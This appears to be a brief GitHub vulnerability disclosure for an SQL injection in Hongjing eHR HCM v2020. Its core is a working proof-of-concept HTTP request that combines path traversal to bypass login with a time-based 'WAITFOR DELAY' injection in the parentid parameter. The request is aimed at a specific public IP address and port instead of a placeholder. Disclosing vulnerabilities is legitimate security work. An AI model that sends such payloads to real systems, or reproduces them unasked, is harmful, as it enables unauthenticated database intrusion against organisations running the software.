Hongjing-ehr-hcm has sql injection vulnerability

verison:v2020

1.The login interface is as shown below
![image](https://github.com/willchen0011/cve/assets/13689053/e44109b3-19da-430f-a304-f741e4e5f212)

2.When accessing the POC without logging in, the page will be delayed for 5 seconds.
```
GET /w_selfservice/oauthservlet/%2e./.%2e/general/inform/org/loadhistroyorgtree?isroot=child&parentid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&kind=2&catalog_id=11&issuperuser=111&manageprive=111&action=111&target= HTTP/1.1
Host: 27.128.160.119:8181
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Upgrade-Insecure-Requests: 1
```

![image](https://github.com/willchen0011/cve/assets/13689053/566a68f2-10be-446b-849b-9dbe68fb99d6)
